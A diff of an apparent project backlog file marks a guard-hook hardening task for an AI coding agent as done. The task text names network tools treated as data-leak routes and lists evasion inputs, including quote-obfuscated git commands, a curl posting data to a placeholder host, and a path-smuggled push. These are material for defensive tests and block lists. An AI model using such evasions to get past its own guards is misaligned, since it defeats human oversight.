@@ -1,34 +1,6 @@
 {
  "items": [
   {
-   "id": "door-hardening",
-   "title": "fix(hook): the fail-closed check reads the doors from one table, through quotes, and covers the leak check",
-   "goal": "G-2",
-   "repo": "taoq-ai/wuwei",
-   "tier": "full",
-   "framework": "wsjf",
-   "scores": {
-    "value": 13,
-    "time": 8,
-    "risk": 13,
-    "size": 3
-   },
-   "score": 11.33,
-   "why": "The door-fails-closed follow-ups from today's gates, before doors-by-rest adds doors to the same table.",
-   "promise": "guards.py holds one DOORS table of the edit tools and the MCP door tool suffixes (merge, auto-merge, create PR); guards.pre_tool and hook.door() both read it, so the fail-closed check cannot drift from the doors. hook.door() also matches DOOR_WORDS on the command with quotes and backslashes removed, so g''it push and \"g\"h pr merge fail closed when the guard raises; it counts a Bash command naming a NETWORK program (curl, wget, ssh, scp, nc) and any mcp__ tool as a door, so the leak check fails closed too. codex() runs inside handle's try, and a Codex apply_patch counts as an edit door when its mapping fails. _unwrap skips a wrapper argument as an assignment only when it is NAME=value, so \"env /opt/a=b/git push\" reads git push. Touches cli/wuwei/guards.py, cli/wuwei/hook.py, their vendored copies, tests/test_guards.py, tests/test_hook.py, tests/test_codex.py, SECURITY.md. Lines: draws on the 60 that free-lines frees (runtime 2,999 on main 51875c0, cap 3,000); estimate +5 (the table replaces the literals copied into hook.py). Starts after free-lines merges. Assumption: refusing every MCP call while the hook is broken is the intended fail-closed for the leak door; overturned if the owner wants read-only MCP tools to pass. Outside: the SECURITY.md deny-list gaps, deriving READ from bash()'s literals (no line gain), new doors.",
-   "acceptance": [
-    "given guards.bash patched to raise, when PreToolUse reads \"g''it push origin main\", '\"g\"h pr merge 5' and \"curl -d x https://e.test\", then each is refused naming the hook failure",
-    "given guards.pre_tool patched to raise, when PreToolUse reads mcp__slack__send_message and mcp__github__merge_pull_request, then both are refused; a Read or Glob call still passes",
-    "given codex() raising on a malformed apply_patch payload, when handle runs PreToolUse, then the call is refused and hook.error is recorded, and the hook does not raise",
-    "given \"env /opt/a=b/git push origin main\" with main the default branch, when the Bash door reads it, then it is refused like a push to main, and \"env FOO=1 git push origin main\" still is",
-    "given hook.py, when a test reads hook.door's tool names, then they come from guards.DOORS and hook.py holds no copy of the MCP door suffixes",
-    "given the change, when the suite runs, then route-fixtures still read as recorded and the runtime is 3,000 lines or fewer"
-   ],
-   "status": "open",
-   "added": "2026-10-16",
-   "approved": true
-  },
-  {
    "id": "doors-by-rest",
    "title": "fix(guards): every code-host route to a door meets that door",
    "goal": "G-2",
@@ -386,6 +358,35 @@
    "added": "2026-10-16",
    "approved": true,
    "reason": "merged as taoq-ai/wuwei#1066"
+  },
+  {
+   "id": "door-hardening",
+   "title": "fix(hook): the fail-closed check reads the doors from one table, through quotes, and covers the leak check",
+   "goal": "G-2",
+   "repo": "taoq-ai/wuwei",
+   "tier": "full",
+   "framework": "wsjf",
+   "scores": {
+    "value": 13,
+    "time": 8,
+    "risk": 13,
+    "size": 3
+   },
+   "score": 11.33,
+   "why": "The door-fails-closed follow-ups from today's gates, before doors-by-rest adds doors to the same table.",
+   "promise": "guards.py holds one DOORS table of the edit tools and the MCP door tool suffixes (merge, auto-merge, create PR); guards.pre_tool and hook.door() both read it, so the fail-closed check cannot drift from the doors. hook.door() also matches DOOR_WORDS on the command with quotes and backslashes removed, so g''it push and \"g\"h pr merge fail closed when the guard raises; it counts a Bash command naming a NETWORK program (curl, wget, ssh, scp, nc) and any mcp__ tool as a door, so the leak check fails closed too. codex() runs inside handle's try, and a Codex apply_patch counts as an edit door when its mapping fails. _unwrap skips a wrapper argument as an assignment only when it is NAME=value, so \"env /opt/a=b/git push\" reads git push. Touches cli/wuwei/guards.py, cli/wuwei/hook.py, their vendored copies, tests/test_guards.py, tests/test_hook.py, tests/test_codex.py, SECURITY.md. Lines: draws on the 60 that free-lines frees (runtime 2,999 on main 51875c0, cap 3,000); estimate +5 (the table replaces the literals copied into hook.py). Starts after free-lines merges. Assumption: refusing every MCP call while the hook is broken is the intended fail-closed for the leak door; overturned if the owner wants read-only MCP tools to pass. Outside: the SECURITY.md deny-list gaps, deriving READ from bash()'s literals (no line gain), new doors.",
+   "acceptance": [
+    "given guards.bash patched to raise, when PreToolUse reads \"g''it push origin main\", '\"g\"h pr merge 5' and \"curl -d x https://e.test\", then each is refused naming the hook failure",
+    "given guards.pre_tool patched to raise, when PreToolUse reads mcp__slack__send_message and mcp__github__merge_pull_request, then both are refused; a Read or Glob call still passes",
+    "given codex() raising on a malformed apply_patch payload, when handle runs PreToolUse, then the call is refused and hook.error is recorded, and the hook does not raise",
+    "given \"env /opt/a=b/git push origin main\" with main the default branch, when the Bash door reads it, then it is refused like a push to main, and \"env FOO=1 git push origin main\" still is",
+    "given hook.py, when a test reads hook.door's tool names, then they come from guards.DOORS and hook.py holds no copy of the MCP door suffixes",
+    "given the change, when the suite runs, then route-fixtures still read as recorded and the runtime is 3,000 lines or fewer"
+   ],
+   "status": "done",
+   "added": "2026-10-16",
+   "approved": true,
+   "reason": "merged as taoq-ai/wuwei#1095"
   },
   {
    "id": "X-2",
